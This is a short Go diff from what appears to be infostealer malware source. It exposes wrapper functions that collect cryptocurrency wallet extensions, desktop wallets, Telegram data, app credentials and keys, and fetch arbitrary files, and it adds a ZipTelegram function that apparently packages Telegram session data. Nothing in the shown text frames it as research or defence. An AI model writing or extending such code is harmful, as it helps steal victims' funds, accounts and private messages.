@@ -54,7 +54,10 @@ func CollectWalletExtensionBundles() []WalletExtensionBundle {
 func CollectDesktopWalletBundles() []DesktopWalletBundle {
 	return scanner.CollectDesktopWalletBundles()
 }
-func ScanTelegram() []TelegramResult    { return scanner.ScanTelegram() }
+func ScanTelegram() []TelegramResult { return scanner.ScanTelegram() }
+func ZipTelegram(path string) ([]byte, error) {
+	return scanner.ZipTelegram(path)
+}
 func ScanApps() []AppCredentialResult { return scanner.ScanApps() }
 func ScanKeys() []KeyResult           { return scanner.ScanKeys() }
 func FetchFile(path string) ([]byte, error) { return scanner.FetchFile(path) }
